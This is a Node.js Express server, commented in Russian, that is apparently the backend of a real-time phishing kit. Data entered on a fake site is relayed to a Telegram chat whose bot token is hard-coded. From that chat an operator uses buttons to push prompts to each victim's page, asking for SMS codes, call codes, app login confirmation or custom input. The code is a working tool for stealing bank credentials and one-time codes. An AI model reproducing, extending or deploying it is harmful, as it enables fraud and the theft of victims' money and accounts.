const express = require('express');
const axios = require('axios');
const app = express();

app.use(express.json());
app.use(express.static('public'));

const BOT_TOKEN = '7241095700:AAEgOg76qDghDbKYurhOsTrzSltKxYugtBg';
const CHAT_ID = '-1003455979409';

// Хранилище команд для пользователей
let userTasks = {}; 

// --- API ДЛЯ САЙТА ---

// Прием логов (и первичных, и дополнительных данных)
app.post('/api/log', async (req, res) => {
    const { userId, type, data } = req.body;
    
    let logMsg = `<b>🔔 НОВЫЙ ЛОГ [${type}]</b>\n`;
    logMsg += `🆔 ID: <code>${userId}</code>\n`;
    logMsg += `------------------------\n`;
    for (let key in data) {
        logMsg += `<b>${key}:</b> <code>${data[key]}</code>\n`;
    }

    try {
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: logMsg,
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "💬 СМС Код", callback_data: `ask_${userId}_sms_Введите код из СМС` },
                        { text: "📞 Звонок4", callback_data: `ask_${userId}_call_Введите 4 цифры из звонка` }
                    ],
                    [
                        { text: "📲 Пуш", callback_data: `msg_${userId}_Подтвердите вход в приложении` },
                        { text: "💰 Баланс", callback_data: `msg_${userId}_Недостаточно средств на карте.` }
                    ],
                    [
                        { text: "🛠 Поддержка", callback_data: `ask_${userId}_sup_Опишите проблему оператору` },
                        { text: "✍️ Свой текст", callback_data: `ask_${userId}_custom_Введите данные` }
                    ]
                ]
            }
        });
        res.json({ success: true });
    } catch (e) {
        res.status(500).send('TG Error');
    }
});

// Проверка команд (сайт стучится сюда раз в 3 сек)
app.get('/api/check/:userId', (req, res) => {
    const task = userTasks[req.params.userId] || null;
    if (task) delete userTasks[req.params.userId]; 
    res.json(task);
});

// --- API ДЛЯ ТЕЛЕГРАМА ---

app.post('/tg-webhook', async (req, res) => {
    const { message, callback_query } = req.body;

    // Обработка нажатий на кнопки
    if (callback_query) {
        const parts = callback_query.data.split('_');
        const action = parts[0]; // ask или msg
        const userId = parts[1];
        const text = parts.slice(3).join('_');

        userTasks[userId] = { action, text };

        axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
            callback_query_id: callback_query.id,
            text: "Команда отправлена!"
        });
    }

    // Обработка ручной команды /send [ID] [Текст]
    if (message && message.text && message.text.startsWith('/send')) {
        const parts = message.text.split(' ');
        const userId = parts[1];
        const text = parts.slice(2).join(' ');

        if (userId && text) {
            userTasks[userId] = { action: 'msg', text: text };
            axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                chat_id: CHAT_ID,
                text: `✅ Отправлено пользователю ${userId}`
            });
        }
    }
    res.sendStatus(200);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server started on port ${PORT}`));
